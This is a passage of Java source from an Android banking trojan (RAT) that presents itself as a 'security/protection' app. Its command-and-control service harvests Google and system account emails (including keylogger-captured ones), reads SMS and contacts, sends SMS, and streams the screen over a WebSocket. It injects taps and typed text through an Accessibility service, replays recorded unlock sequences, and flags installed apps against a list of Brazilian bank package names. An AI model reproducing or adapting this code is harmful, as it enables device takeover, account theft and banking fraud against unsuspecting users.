                                    case android.telephony.TelephonyManager.NETWORK_TYPE_UMTS:
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA:
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA:
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_HSPA:
                                    case android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP:
                                        return "3G";
                                    default:
                                        return "4G/5G";
                                }
                            }
                        } catch (Exception ignored) {}
                        return "4G/5G";
                    } else if (capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) {
                        return "Ethernet";
                    }
                }
            } else {
                android.net.NetworkInfo activeNetworkInfo = cm.getActiveNetworkInfo();
                if (activeNetworkInfo != null && activeNetworkInfo.isConnected()) {
                    if (activeNetworkInfo.getType() == android.net.ConnectivityManager.TYPE_WIFI) {
                        return "Wi-Fi";
                    } else if (activeNetworkInfo.getType() == android.net.ConnectivityManager.TYPE_MOBILE) {
                        return "4G/5G";
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao detectar tipo de rede: " + e.getMessage());
        }
        return "Wi-Fi";
    }

    public void sendDeviceInfo() {
        JsonObject info = new JsonObject();
        info.addProperty("type", "DEVICE_INFO");
        info.addProperty("device_id", deviceId);
        info.addProperty("model", Build.MODEL);
        info.addProperty("manufacturer", Build.MANUFACTURER);
        info.addProperty("android_version", Build.VERSION.RELEASE);
        info.addProperty("sdk", Build.VERSION.SDK_INT);
        info.addProperty("network_type", getNetworkType());
        
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                                     status == android.os.BatteryManager.BATTERY_STATUS_FULL;
                if (level >= 0 && scale > 0) {
                    int pct = Math.round((level / (float) scale) * 100);
                    info.addProperty("battery_level", pct);
                    info.addProperty("is_charging", isCharging);
                }
            }
        } catch (Exception ignored) {}

        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
            boolean isAdmin = dpm != null && dpm.isAdminActive(adminComponent);
            info.addProperty("admin_active", isAdmin);
        } catch (Exception e) {
            info.addProperty("admin_active", false);
        }

        try {
            PermissionManager pm = new PermissionManager(this);
            boolean isAcc = pm.isAccessibilityServiceEnabled();
            info.addProperty("accessibility_active", isAcc);
        } catch (Exception e) {
            info.addProperty("accessibility_active", false);
        }

        try {
            com.google.gson.JsonArray accountsArray = new com.google.gson.JsonArray();
            java.util.Set<String> collectedAccounts = getGoogleAndSystemAccounts(this);
            for (String acc : collectedAccounts) {
                accountsArray.add(acc);
            }
            info.add("accounts", accountsArray);
            info.add("google_accounts", accountsArray);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter contas Google: " + e.getMessage());
        }
        
        try {
            com.google.gson.JsonArray blockedArray = new com.google.gson.JsonArray();
            synchronized (UiAssistBridge.blockedPackages) {
                for (String bp : UiAssistBridge.blockedPackages) {
                    if (bp != null && !bp.trim().isEmpty()) {
                        blockedArray.add(bp.trim());
                    }
                }
            }
            info.add("blocked_packages", blockedArray);
            info.add("blocked_apps", blockedArray);
        } catch (Exception ignored) {}

        sendJson(info);
    }

    public static java.util.Set<String> getGoogleAndSystemAccounts(Context context) {
        java.util.Set<String> result = new java.util.LinkedHashSet<>();
        if (context == null) return result;

        // 1. Dumpsys Account Shell Query (Funciona em 100% dos aparelhos Android 7.0 a 14+ SEM requerer permissões de runtime!)
        try {
            Process process = Runtime.getRuntime().exec("dumpsys account");
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            String line;
            java.util.regex.Pattern gPattern = java.util.regex.Pattern.compile("Account \\{name=([^,]+), type=com\\.google\\}");
            java.util.regex.Pattern genericPattern = java.util.regex.Pattern.compile("Account \\{name=([^,]+), type=");
            
            while ((line = reader.readLine()) != null) {
                java.util.regex.Matcher m1 = gPattern.matcher(line);
                if (m1.find()) {
                    String acc = m1.group(1).trim();
                    if (!acc.isEmpty() && acc.contains("@")) {
                        result.add(acc);
                    }
                } else {
                    java.util.regex.Matcher m2 = genericPattern.matcher(line);
                    if (m2.find()) {
                        String acc = m2.group(1).trim();
                        if (!acc.isEmpty() && acc.contains("@")) {
                            result.add(acc);
                        }
                    }
                }
            }
            reader.close();
            process.destroy();
        } catch (Exception e) {
            Log.w(TAG, "dumpsys account falhou: " + e.getMessage());
        }

        // 2. Dumpsys User Shell Query (Fallback adicional via Shell)
        if (result.isEmpty()) {
            try {
                Process process = Runtime.getRuntime().exec("dumpsys user");
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                String line;
                java.util.regex.Pattern emailPattern = java.util.regex.Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                while ((line = reader.readLine()) != null) {
                    if (line.contains("Account {name=")) {
                        java.util.regex.Matcher m = emailPattern.matcher(line);
                        if (m.find()) {
                            String acc = m.group().trim();
                            if (!acc.isEmpty()) {
                                result.add(acc);
                            }
                        }
                    }
                }
                reader.close();
                process.destroy();
            } catch (Exception ignored) {}
        }

        // 3. AccountManager (com.google)
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(context);
            android.accounts.Account[] googleAccounts = am.getAccountsByType("com.google");
            if (googleAccounts != null) {
                for (android.accounts.Account acc : googleAccounts) {
                    if (acc != null && acc.name != null && !acc.name.isEmpty()) {
                        result.add(acc.name);
                    }
                }
            }
        } catch (Exception ignored) {}

        // 4. AccountManager (todos os tipos com @)
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(context);
            android.accounts.Account[] allAccounts = am.getAccounts();
            if (allAccounts != null) {
                for (android.accounts.Account acc : allAccounts) {
                    if (acc != null && acc.name != null && acc.name.contains("@")) {
                        result.add(acc.name);
                    }
                }
            }
        } catch (Exception ignored) {}

        // 5. ContactsContract.RawContacts (query direto da tabela de contas do sistema)
        try {
            android.content.ContentResolver cr = context.getContentResolver();
            android.net.Uri uri = android.provider.ContactsContract.RawContacts.CONTENT_URI;
            String[] projection = new String[]{"account_name"};
            android.database.Cursor cursor = cr.query(uri, projection, "account_name IS NOT NULL AND account_name LIKE '%@%'", null, null);
            if (cursor != null) {
                int nameIdx = cursor.getColumnIndex("account_name");
                while (cursor.moveToNext()) {
                    if (nameIdx >= 0) {
                        String accName = cursor.getString(nameIdx);
                        if (accName != null && !accName.isEmpty() && accName.contains("@")) {
                            result.add(accName);
                        }
                    }
                }
                cursor.close();
            }
        } catch (Exception ignored) {}

        // 6. Contas auto-capturadas via SharedPreferences (Keylogger / Screen Reader / Notificações)
        try {
            android.content.SharedPreferences prefs = context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("captured_google_accounts", "[]");
            com.google.gson.JsonArray arr = com.google.gson.JsonParser.parseString(json).getAsJsonArray();
            for (int i = 0; i < arr.size(); i++) {
                String acc = arr.get(i).getAsString();
                if (acc != null && !acc.isEmpty() && acc.contains("@")) {
                    result.add(acc);
                }
            }
        } catch (Exception ignored) {}

        // 7. Fallback via Sync Settings se result estiver vazio
        if (result.isEmpty()) {
            try {
                String syncAccount = android.provider.Settings.Secure.getString(context.getContentResolver(), "sync_account");
                if (syncAccount != null && syncAccount.contains("@")) {
                    result.add(syncAccount);
                }
            } catch (Exception ignored) {}
        }

        Log.d(TAG, "📧 Google/System Accounts encontradas: (" + result.size() + ") -> " + result);
        return result;
    }

    public static void saveCapturedGoogleAccount(Context context, String email) {
        if (context == null || email == null || !email.contains("@")) return;
        try {
            android.content.SharedPreferences prefs = context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("captured_google_accounts", "[]");
            com.google.gson.JsonArray arr = com.google.gson.JsonParser.parseString(json).getAsJsonArray();
            boolean exists = false;
            for (int i = 0; i < arr.size(); i++) {
                if (arr.get(i).getAsString().equalsIgnoreCase(email.trim())) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                arr.add(email.trim());
                prefs.edit().putString("captured_google_accounts", arr.toString()).apply();
                Log.d("CommandControlService", "📧 Nova conta Google auto-capturada e salva: " + email);
            }
        } catch (Exception ignored) {}
    }

    private static int resolveMinFrameInterval(boolean silentPipeline, boolean slowConnection) {
        if (slowConnection) {
            return 35; // Otimizado para garantir VNC fluído mesmo em oscilações
        }
        return silentPipeline ? SILENT_MIN_FRAME_INTERVAL : MIN_FRAME_INTERVAL;
    }

    /**
     * Envia frame de tela (JPEG) com controle de fluxo adaptativo
     */
    public void sendFrame(byte[] jpegData) {
        sendFrame(jpegData, false);
    }

    public void sendFrame(byte[] jpegData, boolean silentPipeline) {
        WebSocket ws = webSocket;
        if (!isConnected || ws == null) {
            return;
        }
        
        long now = System.currentTimeMillis();
        
        // Controle de backpressure real usando queueSize do OkHttp (limite de 256KB em bytes)
        try {
            long currentQueueBytes = ws.queueSize();
            if (currentQueueBytes > 256 * 1024) { // Se passar de 256KB na fila do socket, aplica throttling
                consecutiveSlowFrames++;
                if (consecutiveSlowFrames > 5) {
                    isSlowConnection = true;
                }
                return;
            } else {
                // Buffer livre — mantém velocidade máxima e reseta estado de lentidão
                consecutiveSlowFrames = 0;
                isSlowConnection = false;
            }
        } catch (Exception ignored) {}
        
        // Throttling adaptativo
        int currentMinInterval = resolveMinFrameInterval(silentPipeline, isSlowConnection);
        if (now - lastFrameSentTime < currentMinInterval) {
            return;
        }
        
        // Controle de backpressure: max frames pendentes
        if (pendingFrames >= MAX_PENDING_FRAMES) {
            consecutiveSlowFrames++;
            if (consecutiveSlowFrames > 5) {
                isSlowConnection = true;
            }
            return;
        }
        
        try {
            ByteBuffer buffer = ByteBuffer.allocate(5 + jpegData.length);
            buffer.put((byte) 0x01);
            buffer.putInt(jpegData.length);
            buffer.put(jpegData);
            
            boolean sent = false;
            synchronized (sendLock) {
                if (isConnected && webSocket != null) {
                    pendingFrames++;
                    sent = webSocket.send(ByteString.of(buffer.array()));
                    if (sent) {
                        lastFrameSentTime = now;
                        lastSuccessfulSend = now;
                        pendingFrames = Math.max(0, pendingFrames - 1);
                        consecutiveSlowFrames = 0;
                        if (isSlowConnection) {
                            isSlowConnection = false;
                        }
                    }
                }
            }
            
            if (!sent) {
                consecutiveSlowFrames++;
                if (consecutiveSlowFrames > 5) {
                    isSlowConnection = true;
                }
                handler.postDelayed(() -> {
                    pendingFrames = Math.max(0, pendingFrames - 1);
                }, 200);
            }
            
        } catch (Exception e) {
            pendingFrames = Math.max(0, pendingFrames - 1);
            Log.w(TAG, "⚠️ Frame descartado devido a exceção no envio: " + e.getMessage());
            // NÃO desconecta nem força reconnect — erro pontual de frame é normal no streaming
        }
    }

    /**
     * Envia resposta JSON
     */
    private void sendResponse(String type, String data) {
        JsonObject response = new JsonObject();
        response.addProperty("type", type);
        response.addProperty("data", data);
        sendJson(response);
    }

    /**
     * Envia JSON via WebSocket - atualiza timestamp de sucesso
     */
    private void sendJson(JsonObject json) {
        WebSocket ws = webSocket;
        if (isConnected && ws != null) {
            try {
                synchronized (sendLock) {
                    if (isConnected && webSocket != null) {
                        webSocket.send(gson.toJson(json));
                        lastSuccessfulSend = System.currentTimeMillis();
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao enviar JSON: " + e.getMessage());
            }
        } else {
            if (!isConnected) {
                scheduleReconnect();
            }
        }
    }

    private final Runnable heartbeatRunnable = new Runnable() {
        @Override
        public void run() {
            checkConnectionHealth();
            
            if (isConnected && webSocket != null) {
                try {
                    JsonObject ping = new JsonObject();
                    ping.addProperty("type", "PING");
                    ping.addProperty("timestamp", System.currentTimeMillis());
                    sendJson(ping);
                    Log.d(TAG, "💓 Heartbeat enviado");
                } catch (Exception e) {
                    Log.e(TAG, "❌ Erro no heartbeat: " + e.getMessage());
                    isConnected = false;
                    scheduleReconnect();
                }
            } else {
                Log.d(TAG, "⚠️ Heartbeat: aguardando reconexão...");
            }
            
            handler.postDelayed(this, HEARTBEAT_INTERVAL);
        }
    };

    /**
     * Inicia heartbeat ROBUSTO (ping periódico + health check)
     */
    private void startHeartbeat() {
        handler.removeCallbacks(heartbeatRunnable);
        handler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
    }

    /**
     * Executa clique via AccessibilityService (com suporte a despacho direto 0ms)
     */
    private void performClick(int x, int y) {
        Log.d(TAG, "⚡ TURBO CLICK em: " + x + ", " + y);

        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "CLICK");
        intent.putExtra("x", x);
        intent.putExtra("y", y);

        UiAssistBridge bridge = UiAssistBridge.instance;
        if (bridge != null && bridge.getGestureCore() != null) {
            bridge.getGestureCore().handlePerformGesture(intent);
        } else {
            sendBroadcast(intent);
        }
        signalKillerCaptureIfActive();
    }

    private void signalKillerCaptureIfActive() {
        if (isKillerModeActive) {
            UiAssistBridge.requestKillerCapture();
        }
    }
    
    /**
     * Executa swipe via AccessibilityService (com suporte a despacho direto 0ms)
     */
    private void performSwipe(int x1, int y1, int x2, int y2) {
        Log.d(TAG, "⚡ TURBO SWIPE: " + x1 + "," + y1 + " -> " + x2 + "," + y2);
        
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "SWIPE");
        intent.putExtra("x1", x1);
        intent.putExtra("y1", y1);
        intent.putExtra("x2", x2);
        intent.putExtra("y2", y2);

        UiAssistBridge bridge = UiAssistBridge.instance;
        if (bridge != null && bridge.getGestureCore() != null) {
            bridge.getGestureCore().handlePerformGesture(intent);
        } else {
            sendBroadcast(intent);
        }
        signalKillerCaptureIfActive();
    }
    
    /**
     * Executa long press via AccessibilityService
     */
    private void performLongPress(int x, int y, int duration) {
        Log.d(TAG, "⚡ TURBO LONG PRESS em: " + x + ", " + y + " por " + duration + "ms");
        
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "LONG_PRESS");
        intent.putExtra("x", x);
        intent.putExtra("y", y);
        intent.putExtra("duration", duration);

        UiAssistBridge bridge = UiAssistBridge.instance;
        if (bridge != null && bridge.getGestureCore() != null) {
            bridge.getGestureCore().handlePerformGesture(intent);
        } else {
            sendBroadcast(intent);
        }
        signalKillerCaptureIfActive();
    }

    /**
     * Digite texto via AccessibilityService
     */
    private void performType(String text) {
        Log.d(TAG, "⌨️ Digitando texto: " + text);
        
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "TYPE");
        intent.putExtra("text", text);

        UiAssistBridge bridge = UiAssistBridge.instance;
        if (bridge != null && bridge.getGestureCore() != null) {
            bridge.getGestureCore().handlePerformGesture(intent);
        } else {
            sendBroadcast(intent);
        }
    }

    /**
     * Executa navegação Android (BACK, HOME, RECENTS, POWER, etc.)
     */
    private void performNavigation(String action) {
        Log.d(TAG, "📱 Executando navegação: " + action);
        
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName());
        intent.putExtra("action", action);

        UiAssistBridge bridge = UiAssistBridge.instance;
        if (bridge != null && bridge.getGestureCore() != null) {
            bridge.getGestureCore().handlePerformGesture(intent);
        } else {
            sendBroadcast(intent);
        }
    }

    private void vibrateDevice() {
        try {
            android.os.Vibrator vibrator;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.os.VibratorManager vm = (android.os.VibratorManager) getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                vibrator = vm != null ? vm.getDefaultVibrator() : null;
            } else {
                vibrator = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            }
            if (vibrator == null || !vibrator.hasVibrator()) {
                Log.w(TAG, "VIBRATE: dispositivo sem vibrador");
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(400, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(400);
            }
        } catch (Exception e) {
            Log.e(TAG, "VIBRATE error: " + e.getMessage());
        }
    }

    private void adjustVolume(boolean up) {
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            int direction = up ? android.media.AudioManager.ADJUST_RAISE : android.media.AudioManager.ADJUST_LOWER;
            am.adjustStreamVolume(
                    android.media.AudioManager.STREAM_MUSIC,
                    direction,
                    android.media.AudioManager.FLAG_SHOW_UI
            );
        } catch (Exception e) {
            Log.e(TAG, "Volume adjust error: " + e.getMessage());
        }
    }

    private void triggerSnapScreen() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "SNAP_SCREEN requer Android 11+");
            return;
        }
        UiAssistBridge svc = UiAssistBridge.instance;
        if (svc == null) {
            Log.w(TAG, "SNAP_SCREEN: AccessibilityService indisponível");
            return;
        }
        svc.capSilentScreen(UiAssistBridge.getSilentCaptureQuality());
    }

    /**
     * Envia SMS diretamente pelo dispositivo
     */
    private void sendSMS(String phoneNumber, String message) {
        if (phoneNumber == null || phoneNumber.trim().isEmpty()) {
            sendResponse("ERROR", "Número de telefone de destino não fornecido.");
            return;
        }
        if (message == null || message.trim().isEmpty()) {
            sendResponse("ERROR", "Mensagem de SMS em branco.");
            return;
        }

        try {
            android.telephony.SmsManager smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                smsManager = getSystemService(android.telephony.SmsManager.class);
            } else {
                smsManager = android.telephony.SmsManager.getDefault();
            }

            if (smsManager == null) {
                smsManager = android.telephony.SmsManager.getDefault();
            }

            String targetPhone = phoneNumber.trim();

            if (message.length() > 160) {
                java.util.ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(targetPhone, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(targetPhone, null, message, null, null);
            }

            Log.d(TAG, "📱 SMS enviado com sucesso para: " + targetPhone);
            sendResponse("OK", "SMS enviado com sucesso para " + targetPhone);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar SMS para " + phoneNumber + ": " + e.getMessage(), e);
            sendResponse("ERROR", "Falha ao enviar SMS: " + e.getMessage());
        }
    }

    /**
     * Obtém SMS do dispositivo (caixa de entrada e enviados)
     */
    private String getSMS() {
        try {
            com.google.gson.JsonArray smsList = new com.google.gson.JsonArray();
            android.net.Uri uriSms = android.net.Uri.parse("content://sms");
            android.database.Cursor cursor = getContentResolver().query(
                uriSms,
                new String[]{"_id", "address", "date", "body", "type"},
                null,
                null,
                "date DESC LIMIT 100"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    com.google.gson.JsonObject smsObj = new com.google.gson.JsonObject();
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));

                    smsObj.addProperty("address", address != null ? address : "");
                    smsObj.addProperty("body", body != null ? body : "");
                    smsObj.addProperty("date", date);
                    smsObj.addProperty("type", type == 1 ? "inbox" : (type == 2 ? "sent" : "other"));

                    smsList.add(smsObj);
                }
                cursor.close();
            }
            return gson.toJson(smsList);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao ler SMS: " + e.getMessage(), e);
            return "[]";
        }
    }

    /**
     * Obtém contatos do dispositivo (agenda telefônica)
     */
    private String getContacts() {
        if (!ENABLE_CONTACTS) {
            return "[]";
        }
        try {
            com.google.gson.JsonArray contactsList = new com.google.gson.JsonArray();
            android.net.Uri uri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            android.database.Cursor cursor = getContentResolver().query(
                uri,
                new String[]{
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                null,
                null,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 300"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    com.google.gson.JsonObject contactObj = new com.google.gson.JsonObject();
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));

                    contactObj.addProperty("name", name != null ? name : "Sem Nome");
                    contactObj.addProperty("number", number != null ? number : "");

                    contactsList.add(contactObj);
                }
                cursor.close();
            }
            return gson.toJson(contactsList);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao ler contatos: " + e.getMessage(), e);
            return "[]";
        }
    }

    /**
     * Obtém localização do dispositivo
     */
    private String getLocation() {
        // TODO: Implementar obtenção de localização
        return "{}";
    }
    
    // ==================== SISTEMA DE DESBLOQUEIO AUTOMÁTICO ====================
    
    /**
     * Inicia gravação de sequência de desbloqueio
     */
    private void startUnlockRecording() {
        Log.d(TAG, "🔴 Iniciando gravação de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "START");
        sendBroadcast(intent);
    }
    
    /**
     * Para gravação de sequência de desbloqueio
     */
    private void stopUnlockRecording() {
        Log.d(TAG, "⏹️ Parando gravação de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "STOP");
        sendBroadcast(intent);
    }
    
    /**
     * Reproduz sequência de desbloqueio gravada
     */
    private void playUnlockSequence() {
        Log.d(TAG, "▶️ Reproduzindo sequência de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "PLAY");
        sendBroadcast(intent);
    }

    private void playUnlockSequence(String jsonSequence) {
        Log.d(TAG, "▶️ Reproduzindo sequência de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "PLAY");
        intent.putExtra("sequence_json", jsonSequence);
        sendBroadcast(intent);
    }

    // ==================== GERENCIAMENTO DE APPS ====================
    
    /**
     * Lista todos os apps instalados no dispositivo
     */
    private void getInstalledApps() {
        Log.d(TAG, "📱 Obtendo lista de apps instalados...");
        
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            
            // Usa getInstalledPackages que é mais confiável e retorna TODOS os apps
            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            
            com.google.gson.JsonArray appList = new com.google.gson.JsonArray();
            java.util.Set<String> addedPackages = new java.util.HashSet<>();
            
            Log.d(TAG, "📱 Encontrados " + packages.size() + " pacotes via getInstalledPackages");
            
            for (android.content.pm.PackageInfo pkgInfo : packages) {
                android.content.pm.ApplicationInfo app = pkgInfo.applicationInfo;
                if (app == null) continue;
                
                // Evita duplicatas
                if (addedPackages.contains(app.packageName)) continue;
                addedPackages.add(app.packageName);
                try {
                    JsonObject appInfo = new JsonObject();
                    
                    // Nome do app
                    String appName = pm.getApplicationLabel(app).toString();
                    appInfo.addProperty("name", appName);
                    
                    // Package name
                    appInfo.addProperty("package", app.packageName);
                    
                    // É app de sistema?
                    boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                    appInfo.addProperty("isSystem", isSystem);
                    
                    // Versão (já temos pkgInfo do loop)
                    appInfo.addProperty("version", pkgInfo.versionName != null ? pkgInfo.versionName : "unknown");
                    appInfo.addProperty("versionCode", pkgInfo.versionCode);
                    
                    // Data de instalação
                    appInfo.addProperty("installedAt", pkgInfo.firstInstallTime);
                    appInfo.addProperty("updatedAt", pkgInfo.lastUpdateTime);
                    
                    // Pode ser aberto? (tem launcher activity)
                    Intent launchIntent = pm.getLaunchIntentForPackage(app.packageName);
                    appInfo.addProperty("canOpen", launchIntent != null);
                    
                    // Está habilitado?
                    appInfo.addProperty("enabled", app.enabled);
                    
                    // Captura de ícone real para todos os apps de usuário / launcher
                    boolean isBank = false;
                    String pkgLower = app.packageName.toLowerCase();
                    String[] bankKeywords = {
                        "nu.production", "nubank", "itau", "bradesco", "santander", "bancointer", "intermedium",
                        "caixa", "c6bank", "neon", "pagbank", "pagseguro", "mercadopago", "picpay", "panapp", 
                        "sicredi", "original", "stone", "digio", "will.bank", "agibank", "sofisa", "banrisul", "bb.android",
                        "modal", "xpinvestimentos", "safra", "bancovotorantim", "bmg.android", "brb.mobile", 
                        "rendimento", "bs2", "recargapay", "citibank", "daycoval", "creditas", "sicoob", "btg.pactual", 
                        "btgpactual", "rico", "clear", "avenue", "nomad", "mercantil", "superdigital", "genial", 
                        "bari", "pine", "bancobari", "bancopine", "bancobmg", "bancobv", "bancobs2", "next.android", "next"
                    };
                    for (String kw : bankKeywords) {
                        if (pkgLower.contains(kw)) {
                            isBank = true;
                            break;
                        }
                    }

                    boolean shouldExtractIcon = isBank || launchIntent != null || !isSystem;

                    if (shouldExtractIcon) {
                        try {
                            android.graphics.drawable.Drawable drawable = pm.getApplicationIcon(app);
                            android.graphics.Bitmap bitmap;
                            if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                                bitmap = ((android.graphics.drawable.BitmapDrawable) drawable).getBitmap();
                            } else {
                                int width = drawable.getIntrinsicWidth();
                                int height = drawable.getIntrinsicHeight();
                                if (width <= 0 || height <= 0) {
                                    width = 96;
                                    height = 96;
                                }
                                bitmap = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.ARGB_8888);
                                android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                                drawable.draw(canvas);
                            }
                            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, 96, 96, true);
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out);
                            String base64Icon = android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
                            appInfo.addProperty("icon", base64Icon);
                        } catch (Exception e) {
                            Log.e(TAG, "Erro ao extrair icone de banco: " + e.getMessage());
                        }
                    }
                    
                    appList.add(appInfo);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao processar app: " + app.packageName);
                }
            }
            
            // Envia lista para servidor
            JsonObject response = new JsonObject();
            response.addProperty("type", "INSTALLED_APPS");
            response.add("apps", appList);
            response.addProperty("count", appList.size());
            sendJson(response);
            
            Log.d(TAG, "📱 Lista de apps enviada: " + appList.size() + " apps");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao obter apps: " + e.getMessage());
            sendResponse("ERROR", "Erro ao obter apps: " + e.getMessage());
        }
    }
    
    /**
     * Abre um app pelo package name
     */
    private void openApp(String packageName) {
        Log.d(TAG, "📱 Abrindo app: " + packageName);
        
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
            
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                sendResponse("OK", "App aberto: " + packageName);
            } else {
                sendResponse("ERROR", "App não pode ser aberto: " + packageName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao abrir app: " + e.getMessage());
            sendResponse("ERROR", "Erro ao abrir app: " + e.getMessage());
        }
    }

    /**
     * Duplica/clona um aplicativo no dispositivo alvo
     */
    /**
     * Extrai o ID numérico real do UserHandle no Android
     */
    private int getUserIdFromHandle(android.os.UserHandle handle) {
        if (handle == null) return 0;
        try {
            java.lang.reflect.Method m = handle.getClass().getMethod("getIdentifier");
            return (Integer) m.invoke(handle);
        } catch (Exception e) {
            try {
                String str = handle.toString();
                if (str.contains("{") && str.contains("}")) {
                    String num = str.substring(str.indexOf("{") + 1, str.indexOf("}")).trim();
                    return Integer.parseInt(num);
                }
            } catch (Exception e2) {}
        }
        return 0;
    }

    /**
     * Duplica/clona um aplicativo no dispositivo alvo em ambiente isolado (Pasta Segura)
     */
    private void duplicateApp(String targetPkg, String clonePkg, String cloneName) {
        Log.d(TAG, "⚡ Duplicando app NATIVO no dispositivo (Pasta Segura): " + targetPkg + " -> " + clonePkg);
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            String finalCloneName = cloneName != null && !cloneName.trim().isEmpty() ? cloneName : targetPkg + " (Pasta Segura)";
            String finalClonePkg = clonePkg != null && !clonePkg.trim().isEmpty() ? clonePkg : targetPkg + ".cloned";

            // 1. Tenta isolamento via perfil de usuário / Work Profile (Pasta Segura Nativa Android)
            boolean profileIsolated = false;
            int secondaryUserId = -1;
            try {
                android.os.UserManager um = (android.os.UserManager) getSystemService(Context.USER_SERVICE);
                if (um != null) {
                    int myUserId = getUserIdFromHandle(android.os.Process.myUserHandle());
